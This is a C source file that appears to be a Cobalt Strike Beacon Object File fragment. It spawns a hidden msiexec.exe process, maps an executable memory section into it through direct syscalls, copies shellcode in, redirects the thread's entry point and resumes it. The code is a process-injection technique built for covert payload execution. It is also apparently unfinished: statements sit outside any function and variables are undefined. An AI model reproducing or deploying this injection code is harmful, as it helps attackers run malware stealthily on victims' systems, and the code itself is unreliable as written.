
#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"
#include "helpers.h"
#include "syscalls.c"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                      IMPORTS                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess();

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                    PROC SPAWN                                                      //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


STARTUPINFO si;
si.cb = sizeof(si);
ZeroMemory(&si, sizeof(si));

PROCESS_INFORMATION pi;
ZeroMemory(&pi, sizeof(pi));

// load with msiexec.exe and arguments
if(!KERNEL32$CreateProcessA(NULL, "msiexec.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
{
    BeaconPrintf(CALLBACK_ERROR, "Could not spawn a surrogate process");
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                         MAIN                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


    /*==================================*/
    /*            PROCESS OPEN          */
    /*==================================*/

if(pi.hProcess == INVALID_HANDLE_VALUE)
{
    BeaconPrintf(CALLBACK_ERROR, "Invalid handle: %ld", pi.hProcess);
    goto lblCleanup;
}



    /*==================================*/
    /*              PAYLOAD             */
    /*==================================*/
    // from threadinject ->  SIZE_T test_len_replace_me = (SIZE_T)dllLen;

    SIZE_T shellcode_size = (SIZE_T)dllLen;

    /*==================================*/
    /*          CREATE SECTION          */
    /*==================================*/

    NTSTATUS status;
    HANDLE hSection = NULL;
    LARGE_INTEGER section_size = { shellcode_size };
    status = NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not create section: %lx", status);
        goto lblCleanup;
    }

    /*==================================*/
    /*           MAP IN PROC            */
    /*==================================*/

    LPVOID remoteSectionAddress = 0;
    LPVOID localSectionAddress = 0;

    status = NtMapViewOfSection(hSection, KERNEL32$GetCurrentProcess(), &localSectionAddress, 0, 0, NULL, &shellcode_size, ViewUnmap, 0, PAGE_READWRITE);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not map section to local process: %lx", status);
        goto lblCleanup;
    }

    status = NtMapViewOfSection(hSection, pi.hProcess, &remoteSectionAddress, 0, 0, NULL, &shellcode_size, ViewUnmap, 0, PAGE_EXECUTE_READ);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not map section to remote process: %lx", status);
        NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), localSectionAddress);
        goto lblCleanup;
    }
 
    myMemcpy(localSectionAddress, dllPtr, shellcode_size); // maybe dllPtr gives errors
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copied shellcode");

    status = NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), localSectionAddress);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not unmap section from local process: %lx", status);
    }

    /*==================================*/
    /*          UPDATE ENTRYPOINT       */
    /*==================================*/

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    status = NtGetContextThread(pi.hThread, &ctx);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not get remote context: %lx", status);
        goto lblCleanup;
    }

    ctx.Rcx = (DWORD64)remoteSectionAddress;

    status = NtSetContextThread(pi.hThread, &ctx);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not set remote context: %lx", status);
        goto lblCleanup;
    }

    /*==================================*/
    /*          RESUME THREAD           */
    /*==================================*/

    status = NtResumeThread(pi.hThread, NULL);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not resume remote thread: %lx", status);
        goto lblCleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] done\n");

lblCleanup:
    NtClose(hSection);
    NtClose(pi.hThread);
    NtClose(pi.hProcess);
    hSection = NULL;
    return;
